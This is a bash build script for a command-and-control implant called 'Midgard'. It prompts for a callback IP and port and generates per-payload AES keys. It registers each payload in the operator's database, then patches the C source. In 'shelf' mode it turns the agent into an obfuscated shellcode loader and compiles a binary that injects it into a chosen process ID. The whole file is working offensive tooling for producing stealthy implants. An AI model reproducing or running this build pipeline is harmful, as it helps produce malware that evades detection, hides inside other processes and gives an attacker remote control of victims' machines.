#!/bin/bash

# generate AES keys
KEY=$(openssl rand -hex 32 | tr -d '\n')
IV=$(openssl rand -hex 16 | tr -d '\n')
UUID=$(cat /proc/sys/kernel/random/uuid)
TIME=$(date -u +"%Y-%m-%d %H:%M:%S")
sed -i "s/\(profile->compile_id = strdup(\"\)[^\"]*\(\");\)/\1$UUID\2/" Midgard.c

read -p "Enter the agent's name (Default is 'agent'): " NAME
NAME=${NAME:-agent}
read -p "Enter the architecture (Options: x86_64, aarch64; Default: 'x86_64'): " ARCH
ARCH=${ARCH:-x86_64}
read -p "Enter the callback IP (Default is 127.0.0.1): " IP
IP=${IP:-127.0.0.1}
read -p "Enter the callback port (Default is 8000): " PORT
PORT=${PORT:-8000}
read -p "Enter compile mode (Default is 'agent') {agent, pack, shelf}: " MODE
MODE=${MODE:-agent}
read -p "Use AES encryption? (Default is 'y') (y\n): " choice
choice=${choice:-y}
read -p "Enter the path to the Handlers directory (relative to this script) (Default is ../../Handlers): " path
path=${path:-../../Handlers}

if [[ "${choice,,}" == "y" ]]; then
    AES=1
else
    AES=0
fi

sed -i "s/^\(#define HOST \"\)[^\"]*\(\"\)/\1$IP\2/" Midgard.c
sed -i "s/^\(#define PORT \).*/\1$PORT/" Midgard.c
sed -i "s/\(profile->aes = \).*/\1(int *)$AES;/" Midgard.c

if [[ "${MODE,,}" == "shelf" ]]; then
    read -p "Enter the target process ID (PID): " PID
    sed -i "s/^\(#define REFLECT \).*/\11/" Midgard.c
    sed -i "s/^\(#define PID \).*/\1$PID/" ../Obfuscation/process_injection/aarch64_reg.c
else 
    sed -i "s/^\(#define REFLECT \).*/\10/" Midgard.c
fi

source $path/.env
sudo docker exec -it mariadb mariadb -u yggdrasil -D yggdrasil -p$DB_PASS -h $DB_HOST -e "INSERT INTO payloads (compile_id, name, profile, created, use_aes, private, public) VALUES ('$UUID', '$NAME', 'Midgard', '$TIME', '$AES', '$KEY', '$IV')"


if [[ "${MODE,,}" == "shelf" ]]; then
    make agent NAME=$NAME HANDLERS=$path ARCH=$ARCH
    if [[ $ARCH == "aarch64" || $ARCH == "AARCH64" ]]; then
        sed -i "s/^\(#define PID \).*/\1$PID/" ../Obfuscation/process_injection/aarch64_reg.c

        xxd -n "agent" -i ../Compiled_Payloads/$NAME | sed 's/unsigned char/static const unsigned char/g' | sed 's/unsigned int/static const unsigned int/g' > ../Obfuscation/shelf/agent.h
        aarch64-linux-gnu-gcc -O3 -fPIC -fPIE -ffreestanding -fno-builtin -fno-stack-protector -nostdlib -nodefaultlibs -fvisibility=hidden -c ../Obfuscation/shelf/shelf-aarch64.c -o ../Obfuscation/shelf/loader.o
        aarch64-linux-gnu-ld -T ../Obfuscation/shelf/linker.ld --omagic -o ../Obfuscation/shelf/loader.elf ../Obfuscation/shelf/loader.o
        aarch64-linux-gnu-objcopy -O binary ../Obfuscation/shelf/loader.elf ../Obfuscation/shelf/loader.bin
        xxd -n "agent" -i ../Obfuscation/shelf/loader.bin | sed 's/unsigned char/static const unsigned char/g' | sed 's/unsigned int/static const unsigned int/g' > ../Obfuscation/process_injection/agent.h
        aarch64-linux-gnu-gcc -static -pie -s -fPIE -Wall -O3 -o ../Compiled_Payloads/$NAME ../Obfuscation/process_injection/aarch64_reg.c
        rm ../Obfuscation/shelf/agent.h ../Obfuscation/shelf/loader* ../Obfuscation/process_injection/agent.h

    elif [[ $ARCH == "x86_64" || $ARCH == "X86_64" ]]; then
        sed -i "s/^\(#define PID \).*/\1$PID/" ../Obfuscation/process_injection/x86_64_reg.c

        xxd -n "agent" -i ../Compiled_Payloads/$NAME | sed 's/unsigned char/static const unsigned char/g' | sed 's/unsigned int/static const unsigned int/g' > ../Obfuscation/shelf/agent.h
        x86_64-linux-gnu-gcc -O3 -fPIC -fPIE -ffreestanding -fno-builtin -fno-stack-protector -nostdlib -nodefaultlibs -fvisibility=hidden -c ../Obfuscation/shelf/shelf-x86_64.c -o ../Obfuscation/shelf/loader.o
        x86_64-linux-gnu-ld -T ../Obfuscation/shelf/linker.ld --omagic -o ../Obfuscation/shelf/loader.elf ../Obfuscation/shelf/loader.o
        x86_64-linux-gnu-objcopy -O binary ../Obfuscation/shelf/loader.elf ../Obfuscation/shelf/loader.bin
        xxd -n "agent" -i ../Obfuscation/shelf/loader.bin | sed 's/unsigned char/static const unsigned char/g' | sed 's/unsigned int/static const unsigned int/g' > ../Obfuscation/process_injection/agent.h
        x86_64-linux-gnu-gcc -static -pie -s -fPIE -Wall -O3 -o ../Compiled_Payloads/$NAME ../Obfuscation/process_injection/x86_64_reg.c
        rm ../Obfuscation/shelf/agent.h ../Obfuscation/shelf/loader* ../Obfuscation/process_injection/agent.h
    else
        echo "Error: Unknown or unset architecture: $ARCH"
        exit 1
    fi
    
    echo "============== Build complete for $NAME ($ARCH) =============="
else
    make $MODE NAME=$NAME HANDLERS=$path ARCH=$ARCH
    echo "============== Build complete for $NAME ($ARCH) =============="
fi 